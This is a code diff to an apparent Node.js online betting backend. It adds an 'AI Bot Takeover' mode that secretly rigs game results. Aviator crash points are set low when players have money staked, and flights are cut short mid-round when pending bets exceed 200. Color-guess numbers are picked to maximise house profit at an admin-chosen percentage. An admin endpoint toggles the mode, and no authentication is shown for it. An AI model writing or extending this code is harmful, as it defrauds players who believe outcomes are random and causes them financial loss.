@@ -608,6 +608,43 @@ app.post('/api/chat', async (req, res) => {
 
 // --- UNIFIED GAMING BACKEND ENGINE (NODE.JS) ---
 
+// Central AI Bot Takeover In-Memory State & DB Sync
+const botTakeoverState = {
+  global: { enabled: false, profit_pct: 90 },
+  color_guess: { enabled: false, profit_pct: 90 },
+  aviator: { enabled: false, profit_pct: 90 },
+  teenpatti: { enabled: false, profit_pct: 90 },
+  mines: { enabled: false, profit_pct: 90 },
+  boundary: { enabled: false, profit_pct: 90 },
+  youreleven: { enabled: false, profit_pct: 90 }
+};
+
+async function initBotTakeoverState() {
+  try {
+    const keys = Object.keys(botTakeoverState);
+    for (const k of keys) {
+      const record = await prisma.gameState.findUnique({ where: { key: `bot_takeover_${k}` } });
+      if (record && record.data) {
+        botTakeoverState[k] = { ...botTakeoverState[k], ...record.data };
+      }
+    }
+  } catch (err) {
+    console.error("Error initializing bot takeover state:", err);
+  }
+}
+initBotTakeoverState();
+
+function isBotTakeoverActive(gameKey) {
+  if (botTakeoverState.global && botTakeoverState.global.enabled) {
+    return { active: true, profit_pct: botTakeoverState.global.profit_pct || 90, source: 'global' };
+  }
+  const gameConf = botTakeoverState[gameKey];
+  if (gameConf && gameConf.enabled) {
+    return { active: true, profit_pct: gameConf.profit_pct || 90, source: 'game' };
+  }
+  return { active: false, profit_pct: 90, source: 'none' };
+}
+
 // 1. Centralized Aviator State Engine
 let aviatorState = {
   round_id: 10001,
@@ -631,9 +668,23 @@ function tickAviator() {
       aviatorState.phase = 'running';
       aviatorState.phase_start = now;
       
+      const bot = isBotTakeoverActive('aviator');
       if (nextAviatorOverride && nextAviatorOverride >= 1.0) {
         aviatorState.crash_point = nextAviatorOverride;
         nextAviatorOverride = null;
+      } else if (bot.active) {
+        // AI Bot Autonomous Multiplier Selection
+        const totalStake = aviatorState.bets.reduce((sum, b) => sum + (parseFloat(b.amount) || 0), 0);
+        if (totalStake > 0) {
+          const targetPct = bot.profit_pct || 90;
+          if (Math.random() * 100 <= targetPct) {
+            aviatorState.crash_point = parseFloat((1.12 + Math.random() * 0.42).toFixed(2));
+          } else {
+            aviatorState.crash_point = parseFloat((1.80 + Math.random() * 1.50).toFixed(2));
+          }
+        } else {
+          aviatorState.crash_point = parseFloat((1.20 + Math.random() * 2.80).toFixed(2));
+        }
       } else {
         const p = Math.random();
         if (Math.random() < 0.03) {
@@ -647,6 +698,17 @@ function tickAviator() {
     }
   } else if (aviatorState.phase === 'running') {
     const computedMult = Math.exp(0.06 * elapsed);
+    
+    // Check AI Bot Dynamic Crash Intercept during flight if high player exposure
+    const bot = isBotTakeoverActive('aviator');
+    if (bot.active && computedMult >= 1.15) {
+      const inFlightBets = aviatorState.bets.filter(b => b.status === 'pending');
+      const inFlightStake = inFlightBets.reduce((sum, b) => sum + (parseFloat(b.amount) || 0), 0);
+      if (inFlightStake > 200 && computedMult >= aviatorState.crash_point * 0.9) {
+        aviatorState.crash_point = Math.min(aviatorState.crash_point, parseFloat(computedMult.toFixed(2)));
+      }
+    }
+
     if (computedMult >= aviatorState.crash_point) {
       aviatorState.phase = 'crashed';
       aviatorState.phase_start = now;
@@ -807,24 +869,35 @@ async function settleColorRound(room, targetRound, state) {
   const override = overrideRecord ? overrideRecord.data : {};
   const roundBets = (state[room].bets && state[room].bets[targetRound]) ? state[room].bets[targetRound] : [];
 
+  const bot = isBotTakeoverActive('color_guess');
+
   let num = null;
+  let was_rigged = false;
+  let rig_desc = '';
+
   if (override && override.number !== undefined && override.number !== null && override.number !== '') {
     num = parseInt(override.number);
+    was_rigged = true;
+    rig_desc = `Number Fixed: ${override.number} `;
   } else if (override && (override.rig_type === 'platform_profit' || override.rig_type === 'max_profit')) {
     const optimal = calculateColorOptimalOutcome(roundBets, targetRound);
     num = optimal.best_number;
+    was_rigged = true;
+    rig_desc = `Auto-Rig: Max Profit `;
   } else if (override && override.rig_type === 'user_win') {
     const optimal = calculateColorOptimalOutcome(roundBets, targetRound);
     num = optimal.worst_number;
-  } else {
+    was_rigged = true;
+    rig_desc = `Auto-Rig: User Win `;
+  } else if (override && (override.color || override.size)) {
     let possible = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
-    if (override && override.color) {
+    if (override.color) {
       const c = override.color;
       if (c === 'Green') possible = possible.filter(n => [1, 3, 5, 7, 9].includes(n));
       else if (c === 'Red') possible = possible.filter(n => [0, 2, 4, 6, 8].includes(n));
       else if (c === 'Violet') possible = possible.filter(n => [0, 5].includes(n));
     }
-    if (override && override.size) {
+    if (override.size) {
       const sz = override.size;
       if (sz === 'Small') possible = possible.filter(n => n <= 4);
       else if (sz === 'Big') possible = possible.filter(n => n >= 5);
@@ -843,32 +916,29 @@ async function settleColorRound(room, targetRound, state) {
     } else {
       num = Math.floor(Math.random() * 10);
     }
-  }
-  
-  const resolved = resolveColorNumber(num);
-  if (override && override.color) {
-    resolved.color = override.color;
-    if (override.color === 'Green') resolved.dotClass = 'green';
-    else if (override.color === 'Red') resolved.dotClass = 'red';
-    else if (override.color === 'Violet') resolved.dotClass = 'violet';
-  }
-  if (override && override.size) {
-    resolved.size = override.size;
-  }
-  
-  await prisma.gameState.upsert({
-    where: { key: overrideKey },
-    update: { data: { color: '', number: '', size: '', rig_type: '' } },
-    create: { key: overrideKey, data: { color: '', number: '', size: '', rig_type: '' } }
-  });
-  
-  const was_rigged = !!(override && ((override.number !== undefined && override.number !== null && override.number !== '') || override.color || override.size || override.rig_type));
-  let rig_desc = '';
-  if (override) {
-    if (override.number !== undefined && override.number !== null && override.number !== '') rig_desc += `Number Fixed: ${override.number} `;
+    was_rigged = true;
     if (override.color) rig_desc += `Color Fixed: ${override.color} `;
     if (override.size) rig_desc += `Size Fixed: ${override.size} `;
-    if (override.rig_type) rig_desc += `Auto-Rig: ${override.rig_type} `;
+  } else if (bot.active) {
+    // Autonomous AI Bot Takeover Execution
+    was_rigged = true;
+    rig_desc = `🤖 AI Bot (${bot.profit_pct}% Profit Target) `;
+    const optimal = calculateColorOptimalOutcome(roundBets, targetRound);
+    
+    if (roundBets.length > 0) {
+      const sortedByProfit = [...optimal.outcomes].sort((a, b) => b.adminProfit - a.adminProfit);
+      const isHouseWinRound = (Math.random() * 100) <= bot.profit_pct;
+      if (isHouseWinRound) {
+        num = sortedByProfit[0].number;
+      } else {
+        const organicCandidates = sortedByProfit.filter(o => o.playerPayout > 0);
+        num = (organicCandidates.length > 0) ? organicCandidates[0].number : sortedByProfit[0].number;
+      }
+    } else {
+      num = optimal.best_number;
+    }
+  } else {
+    num = Math.floor(Math.random() * 10);
   }
 
   const historyEntry = {
@@ -1079,7 +1149,8 @@ app.get('/api/game_sync.php', async (req, res) => {
           history: aviatorState.history
         },
         color_guess: colorGuess,
-        teen_patti: []
+        teen_patti: [],
+        bot_takeover: botTakeoverState
       });
     } else {
       res.status(400).json({ error: 'Unsupported GET action' });
@@ -1094,7 +1165,30 @@ app.post('/api/game_sync.php', async (req, res) => {
   const username = req.query.username || req.body.username || 'DemoUser';
 
   try {
-    if (action === 'color_place_bet') {
+    if (action === 'admin_set_bot_takeover') {
+      const { game, enabled, profit_pct } = req.body;
+      const gameKey = game || 'global';
+      const isEnabled = String(enabled) === 'true' || enabled === true;
+      const pct = parseInt(profit_pct) || 90;
+
+      botTakeoverState[gameKey] = {
+        enabled: isEnabled,
+        profit_pct: Math.max(1, Math.min(100, pct))
+      };
+
+      await prisma.gameState.upsert({
+        where: { key: `bot_takeover_${gameKey}` },
+        update: { data: botTakeoverState[gameKey] },
+        create: { key: `bot_takeover_${gameKey}`, data: botTakeoverState[gameKey] }
+      });
+
+      res.json({
+        success: true,
+        game: gameKey,
+        config: botTakeoverState[gameKey],
+        all_states: botTakeoverState
+      });
+    } else if (action === 'color_place_bet') {
       const { room, category, value, amount } = req.body;
       const betAmt = parseFloat(amount);
 
